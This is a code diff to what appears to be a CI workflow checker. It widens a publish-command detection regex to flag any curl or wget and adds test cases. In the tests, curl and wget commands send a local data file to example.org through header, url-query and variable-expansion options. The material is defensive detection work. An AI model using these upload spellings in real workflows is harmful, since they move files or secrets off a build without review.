@@ -19,8 +19,8 @@ What the check does:
   workspace, and setup-uv must not save its cache (``save-cache: false``).
   Every artifact upload must name literal files reviewed for that job in
   ``REVIEWED``: no directories, globs, exclusions or expressions. Every run
-  line that matches ``PUBLISH_COMMAND`` must be, in full, a command reviewed
-  for that job. A job that commits its whole workspace may run only its
+  line that matches ``PUBLISH_COMMAND`` (any curl or wget, and the known
+  publishing commands) must be, in full, a command reviewed for that job. A job that commits its whole workspace may run only its
   reviewed lines (``runs_only``), with no ``shell``, ``env``,
   ``working-directory``, ``defaults`` or ``container`` that could change what
   those lines run.
@@ -110,12 +110,14 @@ REVIEWED = {
     },
 }
 
+# Any curl or wget counts, not only their upload options: each review round
+# found another spelling that sends a file (curl's -sT, -H @file, --url-query
+# name@file, --variable name@file with --expand-url; Sol re-reviews 3 to 5 and
+# the delta review of #603). No uk-data workflow runs either, so a new use
+# needs reviewing, like any other command here.
 PUBLISH_COMMAND = re.compile(
     r"make upload|publish-git-tag|\bgh\s+[a-z]"  # any gh command
-    r"|\bgit push\b"
-    r"|\bcurl\b.*(--upload-file|--form|--json|--data|--config"
-    r"|--request\s+(POST|PUT|PATCH)|-X\s*(POST|PUT|PATCH)|\s-[^\s-]*[TFdK])"
-    r"|\bcurl\b.*(\s-[^\s-]*H|--header|--url-query)[\s=]*[\"']?@|\bwget\b.*--(post|body)-(file|data)"
+    r"|\bgit push\b|\bcurl\b|\bwget\b"
     r"|\baws s3\b|\bgsutil\b|\bgcloud\b|huggingface-cli|\bhf upload\b|\btwine\b"
 )
 _NOT_LITERAL = re.compile(r"[*?\[\]{}!]|\$\{\{")
@@ -392,6 +394,13 @@ def test_an_unreviewed_upload_from_a_data_job_fails(path):
         {"run": "curl --header=@la_calibration_log.csv https://example.org/"},
         {"run": "curl -sH @la_calibration_log.csv https://example.org/"},
         {"run": "curl --url-query @la_calibration_log.csv https://example.org/"},
+        {"run": 'curl --url-query "q@la_calibration_log.csv" https://example.org/'},
+        {
+            "run": "curl --variable x@la_calibration_log.csv "
+            '--expand-url "https://example.org/{{x}}"'
+        },
+        {"run": "curl https://example.org/"},
+        {"run": "wget -q https://example.org/"},
         {"run": "wget --post-file=la_calibration_log.csv https://example.org/"},
     ],
 )
